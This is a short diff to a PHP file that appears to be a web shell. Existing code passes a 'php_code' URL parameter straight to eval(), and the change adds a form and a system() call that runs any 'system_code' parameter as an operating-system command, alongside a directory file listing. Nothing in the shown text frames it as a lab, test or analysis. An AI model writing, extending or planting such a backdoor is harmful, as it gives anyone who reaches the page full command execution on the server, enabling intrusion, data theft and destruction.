@@ -22,11 +22,22 @@
     //Variables Declaration
     
 
-    //Execute Command
+    //Execute PHP Command
     if (isset($_GET['php_code'])){
         eval($_GET['php_code']);
     }
     
+    //Execute system command
+?>	
+    	<form>
+            <label>Enter SYSTEM CODE : </label>
+            <input type="text" name="system_code" />
+            <input type="submit" value="Execute" />
+        </form>
+<?php
+	if (isset($_GET['system_code'])){
+        system($_GET['system_code']);
+    	}
     //List Files
     $files = scandir(dirname(__FILE__));
     echo"<table><tr><th colspan='2'>List of Files</th></tr>";
